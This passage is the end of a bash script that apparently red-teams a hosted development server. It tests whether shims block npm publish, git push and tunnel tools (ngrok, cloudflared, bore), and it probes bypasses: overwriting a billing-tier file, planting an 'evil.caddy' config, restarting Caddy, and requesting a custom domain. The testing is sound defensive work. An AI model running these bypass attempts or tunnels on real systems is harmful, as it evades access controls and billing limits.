    warn "$tool shim not active or missing upgrade message"
  fi
done

echo ""

# ---- 9.4: npm publish shim ----
echo "  --- 9.4: npm publish shim ---"

NPM_PUB_OUT=$(npm publish 2>&1)
NPM_PUB_EXIT=$?
if [ "$NPM_PUB_EXIT" -ne 0 ] && echo "$NPM_PUB_OUT" | grep -qi "free tier\|blocked\|upgrade"; then
  pass "npm publish blocked by shim with upgrade message"
else
  warn "npm publish shim not active (exit=$NPM_PUB_EXIT)"
fi

# Test: npm install should still work
NPM_INSTALL_OUT=$(npm install --dry-run express 2>&1)
NPM_INSTALL_EXIT=$?
if [ "$NPM_INSTALL_EXIT" -eq 0 ] || echo "$NPM_INSTALL_OUT" | grep -qi "added\|up to date\|dry run"; then
  pass "npm install works through shim (passthrough)"
else
  warn "npm install may be broken through shim"
fi

echo ""

# ---- 9.5: Tunnel tool shims ----
echo "  --- 9.5: Tunnel tool shims ---"

TUNNEL_SHIMS="ngrok cloudflared bore localtunnel lt expose"
for tool in $TUNNEL_SHIMS; do
  TOOL_OUT=$($tool 2>&1)
  TOOL_EXIT=$?
  if [ "$TOOL_EXIT" -ne 0 ] && echo "$TOOL_OUT" | grep -qi "blocked\|free tier\|upgrade\|tunnel"; then
    pass "$tool shim active (shows upgrade message)"
  elif ! command -v "$tool" &>/dev/null; then
    pass "$tool not found in PATH (acceptable)"
  else
    warn "$tool shim not active"
  fi
done

echo ""

# ---- 9.6: Shim bypass test (defense in depth) ----
echo "  --- 9.6: Shim bypass (Warden backstop) ---"

# Test: directly calling /usr/bin/git push should still be blocked by Warden
if [ -f /usr/bin/git ]; then
  BYPASS_OUT=$(/usr/bin/git push https://github.com/test/nonexistent.git main 2>&1)
  BYPASS_EXIT=$?
  if [ "$BYPASS_EXIT" -ne 0 ]; then
    pass "/usr/bin/git push failed (Warden backstop works even without shim)"
  else
    fail "/usr/bin/git push succeeded when bypassing shim (WARDEN FAILURE)"
  fi
fi

# ============================================
# Domain 10: Dev Preview Enforcement
# ============================================
echo "=== Domain 10: Dev Preview Enforcement ==="

# Test: billing-tier file reads "free"
BILLING_TIER=$(cat /etc/ellul/billing-tier 2>/dev/null || echo "missing")
if [ "$BILLING_TIER" = "free" ]; then
  pass "billing-tier reads 'free'"
elif [ "$BILLING_TIER" = "missing" ]; then
  fail "billing-tier file not found at /etc/ellul/billing-tier"
else
  warn "billing-tier reads '$BILLING_TIER' (expected 'free' for free tier servers)"
fi

# Test: coder cannot write to billing-tier
if echo "paid" > /etc/ellul/billing-tier 2>/dev/null; then
  fail "coder can overwrite billing-tier (tier bypass!)"
  # Restore
  echo "free" > /etc/ellul/billing-tier 2>/dev/null || true
else
  pass "coder cannot write to billing-tier"
fi

# Test: coder cannot write to /etc/caddy/ directory
if touch /etc/caddy/sites-enabled/evil.caddy 2>/dev/null; then
  fail "coder can write to /etc/caddy/sites-enabled/ (Caddy config injection!)"
  rm -f /etc/caddy/sites-enabled/evil.caddy 2>/dev/null
else
  pass "coder cannot write to /etc/caddy/sites-enabled/"
fi

# Test: coder cannot reload Caddy
if systemctl reload caddy 2>/dev/null; then
  fail "coder can reload Caddy (service manipulation!)"
else
  pass "coder cannot reload Caddy"
fi

# Test: coder cannot restart Caddy
if systemctl restart caddy 2>/dev/null; then
  fail "coder can restart Caddy"
else
  pass "coder cannot restart Caddy"
fi

# Test: ellul-expose returns isPreview for free tier
# Start a temporary listener to test against
python3 -m http.server 9876 --bind 127.0.0.1 &>/dev/null &
HTTP_PID=$!
sleep 1

if kill -0 $HTTP_PID 2>/dev/null; then
  EXPOSE_RESULT=$(curl -sf -X POST http://localhost:3005/api/workflow/expose \
    -H "Content-Type: application/json" \
    -d '{"name":"redteam-test","port":9876,"projectPath":"/tmp/redteam"}' 2>&1)
  EXPOSE_EXIT=$?

  if [ "$EXPOSE_EXIT" -eq 0 ] && [ -n "$EXPOSE_RESULT" ]; then
    IS_PREVIEW=$(echo "$EXPOSE_RESULT" | jq -r '.isPreview // empty' 2>/dev/null)
    if [ "$IS_PREVIEW" = "true" ]; then
      pass "expose returns isPreview:true on free tier"
    else
      fail "expose did not return isPreview:true (got: $IS_PREVIEW)"
    fi

    # Check that the generated Caddy config has forward_auth
    if [ -f /etc/caddy/sites-enabled/redteam-test.caddy ]; then
      if grep -q "forward_auth" /etc/caddy/sites-enabled/redteam-test.caddy; then
        pass "Caddy config contains forward_auth (owner-only preview)"
      else
        fail "Caddy config missing forward_auth (app would be PUBLIC on free tier!)"
      fi
    else
      warn "Could not verify Caddy config (file not found)"
    fi

    # Clean up test app
    curl -sf -X DELETE http://localhost:3005/api/workflow/expose/redteam-test 2>/dev/null || true
    rm -f /etc/caddy/sites-enabled/redteam-test.caddy 2>/dev/null || true
    rm -f /home/coder/.ellul/apps/redteam-test.json 2>/dev/null || true
  else
    warn "expose endpoint not reachable (sovereign-shield may not be running)"
  fi

  kill $HTTP_PID 2>/dev/null
  wait $HTTP_PID 2>/dev/null
else
  warn "Could not start test HTTP server (skipping expose tests)"
fi

# Test: custom domain rejected on free tier
CUSTOM_RESULT=$(curl -sf -X POST http://localhost:3005/api/workflow/expose \
  -H "Content-Type: application/json" \
  -d '{"name":"evil","port":9876,"customDomain":"evil.example.com"}' 2>&1)
CUSTOM_EXIT=$?
if [ -n "$CUSTOM_RESULT" ]; then
  CUSTOM_ERROR=$(echo "$CUSTOM_RESULT" | jq -r '.error // empty' 2>/dev/null)
  if echo "$CUSTOM_ERROR" | grep -qi "sovereign\|custom domain"; then
    pass "Custom domain rejected on free tier"
  elif [ -n "$CUSTOM_ERROR" ]; then
    pass "Custom domain rejected: $CUSTOM_ERROR"
  else
    fail "Custom domain NOT rejected on free tier!"
  fi
else
  warn "Could not test custom domain rejection (sovereign-shield may not be running)"
fi

echo ""

echo ""
echo "============================================"
echo "  RESULTS"
echo "============================================"
echo -e "  ${GREEN}Secure:${NC}     $PASS_COUNT"
echo -e "  ${RED}Vulnerable:${NC} $FAIL_COUNT"
echo -e "  ${YELLOW}Warning:${NC}    $WARN_COUNT"
echo "============================================"

if [ "$FAIL_COUNT" -gt 0 ]; then
  echo -e "  ${RED}VERDICT: SERVER IS NOT SECURE${NC}"
  echo "  Fix all VULNERABLE items before deploying."
  exit 1
else
  echo -e "  ${GREEN}VERDICT: ALL CRITICAL CHECKS PASSED${NC}"
  exit 0
fi
